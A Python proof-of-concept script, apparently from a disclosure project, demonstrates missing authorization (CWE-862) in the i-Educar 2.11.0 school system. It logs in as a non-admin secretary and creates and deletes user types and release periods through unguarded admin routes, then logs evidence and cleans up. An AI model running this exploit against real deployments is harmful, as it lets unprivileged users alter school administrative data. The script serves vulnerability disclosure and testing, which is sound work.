#!/usr/bin/env python3
"""VULN 02 — missing authorization on administrative write routes.

Routes in `routes/web.php` for school classes (`POST|DELETE /turma`), release
periods (`/periodo-lancamento/*`) and user types (`/usuarios/tipos*`) live in
the global `auth` middleware group but carry no `can:` middleware, and the
controllers do not check `isAdmin()` in their write actions. A non-admin user
(secretary profile, level 2) can create and delete user types and release
periods even though the listing pages deny read access.
"""

from __future__ import annotations

import os
import re
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT))

from lib import credentials, evidence, http_util, lab_guard, poc_cli  # noqa: E402

VULN = {
    "id": "02",
    "slug": "missing-authorization-admin-routes",
    "title": "Missing authorization on administrative write routes",
    "product": "i-Educar",
    "affected_version": "2.11.0 (latest release, tag 2.11.0)",
    "cwe_id": "CWE-862",
    "cwe_name": "Missing Authorization",
    "cwe_source_url": "https://cwe.mitre.org/data/definitions/862.html",
    "cwe_confidence": "high",
    "cwe_justification": (
        "The write routes/controllers perform no authorization check at all (no can: "
        "middleware, no isAdmin()/Gate call), which is exactly CWE-862. CWE-285 would be "
        "the parent for checks that exist but are wrong, and CWE-639 (user-controlled key) "
        "does not apply because there is no object-ownership check to bypass."
    ),
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H",
    "cvss_score": 8.1,
    "endpoint": "POST /turma; POST /periodo-lancamento/criar; GET /periodo-lancamento/excluir; POST|PUT|DELETE /usuarios/tipos*",
    "params": ["name", "level", "ano", "stage_type", "stage", "escola", "periods[]"],
    "precondition": "login as a non-admin profile (secretary, level 2)",
    "reported_at": "",
    "followups": [],
    "silence_days": 0,
    "status": "verified",
    "blocked_reason": "",
    "screenshots": [
        "evidence/screenshots/02-missing-authorization-admin-routes-01-usertype-created-as-secretary.png",
        "evidence/screenshots/02-missing-authorization-admin-routes-02-release-period-created-as-secretary.png",
        "evidence/screenshots/02-missing-authorization-admin-routes-03-raw-proof.png",
    ],
    "advisory_url": "https://github.com/pollotherunner/i-explorar/blob/main/vulns/02-missing-authorization-admin-routes/README.md",
}

SECRETARY = credentials.credentials("secretary")
ADMIN = credentials.credentials("admin")


def _log_response(log: evidence.EvidenceLog, label: str, response: http_util.Response) -> None:
    log.write("")
    log.write(f"### {label}")
    log.write(f"HTTP {response.status}")
    if response.location:
        log.write(f"location: {response.location}")
    body = response.text.strip()
    log.block("body", body[:1500] if body else "(empty)")


def run(target: str, *, verbose: bool = False) -> dict:
    lab_guard.check_target(target)

    vuln_dir = Path(__file__).resolve().parent
    log = evidence.EvidenceLog(vuln_dir)
    notes: list[str] = []
    log.write(f"# target: {target}")

    secretary = http_util.HttpClient(target, verbose=verbose)
    admin = http_util.HttpClient(target, verbose=verbose)

    sec_login = secretary.login(*SECRETARY)
    log.write(f"# secretary login -> HTTP {sec_login.status}")
    adm_login = admin.login(*ADMIN)
    log.write(f"# admin login -> HTTP {adm_login.status}")
    if not (secretary.logged_in() and admin.logged_in()):
        log.close()
        return {"vulnerable": False, "evidence": [str(log.path)], "notes": "login failed"}

    marker = f"IEXPLORAR_POC_{os.getpid()}"
    user_type_id = None
    period_ids_before: set[str] = set()
    create_ok = delete_ok = period_created = period_deleted = False
    turma_reached = False

    try:
        # 1. /turma reaches the controller instead of being refused.
        turma = secretary.post("/turma", data={})
        _log_response(log, "POST /turma as secretary (no authorization gate)", turma)
        turma_reached = turma.status in (200, 302, 500) and b"negado" not in turma.body

        # 2. create a user type as the non-admin
        created = secretary.post(
            "/usuarios/tipos",
            data={"name": marker, "level": "4", "description": "i-explorar poc"},
        )
        _log_response(log, f"POST /usuarios/tipos as secretary (name={marker})", created)
        create_ok = created.status == 302 and "/usuarios/tipos" in created.location

        # 3. the same user cannot read the listing -> write allowed, read denied
        denied = secretary.get("/usuarios/tipos")
        _log_response(log, "GET /usuarios/tipos as secretary (read is denied)", denied)
        read_denied = denied.status == 302 and "negado=1" in denied.location

        # 4. admin sees the new row and we learn its id
        listing = admin.get("/usuarios/tipos")
        match = re.search(
            rf'href="[^"]*/usuarios/tipos/(\d+)"[^>]*>{re.escape(marker)}<', listing.text
        )
        if match:
            user_type_id = match.group(1)
        log.write(f"# created user type id (from admin listing): {user_type_id}")

        # 5. non-admin deletes it
        if user_type_id:
            deleted = secretary.delete(f"/usuarios/tipos/{user_type_id}")
            _log_response(log, f"DELETE /usuarios/tipos/{user_type_id} as secretary", deleted)
        else:
            deleted = None

        # 6. admin confirms it is gone
        listing_after = admin.get("/usuarios/tipos")
        delete_ok = bool(user_type_id and marker not in listing_after.text)
        log.write(f"# row absent after delete: {delete_ok}")

        # 7. release period created by the non-admin
        period_before = secretary.get("/periodo-lancamento")
        period_ids_before = set(re.findall(r'/periodo-lancamento/(\d+)(?=["\'])', period_before.text))

        period = secretary.post(
            "/periodo-lancamento/criar",
            data={
                "ano": "2026",
                "ref_cod_instituicao": "1",
                "escola[0][0]": "2",
                "stage_type": "2",
                "stage": "1",
                "start_date[]": "01/03/2026",
                "end_date[]": "01/11/2026",
            },
        )
        _log_response(log, "POST /periodo-lancamento/criar as secretary", period)

        period_after = secretary.get("/periodo-lancamento")
        ids_after = set(re.findall(r'/periodo-lancamento/(\d+)(?=["\'])', period_after.text))
        new_ids = sorted(ids_after - period_ids_before)
        period_created = period.status == 302 and bool(new_ids)
        log.write(f"# release period ids before={sorted(period_ids_before)} after={sorted(ids_after)}")

        # 8. non-admin deletes the period
        if new_ids:
            target_id = new_ids[-1]
            deleted_period = secretary.get(
                f"/periodo-lancamento/excluir?periods%5B%5D={target_id}"
            )
            _log_response(
                log, f"GET /periodo-lancamento/excluir?periods[]={target_id} as secretary",
                deleted_period,
            )
            period_final = secretary.get("/periodo-lancamento")
            final_ids = set(re.findall(r'/periodo-lancamento/(\d+)(?=["\'])', period_final.text))
            period_deleted = target_id not in final_ids
            log.write(f"# release period {target_id} absent after delete: {period_deleted}")
        else:
            log.write("# no new release period id observed; create may have failed")

        vulnerable = create_ok and delete_ok and period_created and period_deleted
        if verbose:
            log.write(
                f"# checks: turma_reached={turma_reached} create_ok={create_ok} "
                f"read_denied={read_denied} delete_ok={delete_ok} "
                f"period_created={period_created} period_deleted={period_deleted}"
            )
        notes.append(
            f"user type create={create_ok} delete={delete_ok} (read denied={read_denied}); "
            f"release period create={period_created} delete={period_deleted}; "
            f"POST /turma reached controller={turma_reached}"
        )
    finally:
        # best-effort cleanup of anything left behind
        if user_type_id:
            secretary.delete(f"/usuarios/tipos/{user_type_id}")
        for leftover in sorted(
            set(re.findall(r'/periodo-lancamento/(\d+)(?=["\'])', secretary.get("/periodo-lancamento").text))
            - period_ids_before
        ):
            secretary.get(f"/periodo-lancamento/excluir?periods%5B%5D={leftover}")
        log.close()

    return {"vulnerable": vulnerable, "evidence": [str(log.path)], "notes": "; ".join(notes)}


def main(argv: list[str] | None = None) -> int:
    return poc_cli.poc_main(VULN, run, argv, __file__)


if __name__ == "__main__":
    sys.exit(main())
